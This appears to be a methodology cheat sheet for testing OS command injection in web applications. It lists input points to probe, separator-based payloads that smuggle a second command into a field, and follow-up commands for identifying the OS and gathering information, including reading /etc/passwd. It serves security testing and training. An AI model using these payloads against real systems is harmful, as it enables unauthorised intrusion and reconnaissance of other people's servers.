# OS Command Injection - Methodology & Cheat Sheet

## 🎯 Quick Checklist

### 1) Identify Entry Points
- URL parameters (`?id=1&file=test`)
- POST data (forms, JSON, XML)
- Headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- Cookies
- File uploads (filename)
- API endpoints

### 2) Test Payloads (Start Simple)
```text
; whoami
& whoami
| whoami
|| whoami
whoami
$(whoami)
```

### 3) Confirm Injection
```text
; echo test
& echo test
| echo test
|| echo test
```

### 4) Determine OS
```text
; uname -a                 # Linux
; ver                      # Windows
; ping -c 1 127.0.0.1      # Linux
; ping -n 1 127.0.0.1      # Windows
```

### 5) Extract Information

| Goal | Linux | Windows |
|------|-------|---------|
| Current user | `whoami` | `whoami` |
| OS version | `uname -a` | `ver` |
| Network | `ifconfig` / `ip a` | `ipconfig` |
| Processes | `ps -ef` | `tasklist` |
| Files | `ls -la` | `dir` |
| System info | `cat /etc/passwd` | `type C:\Windows\win.ini` |

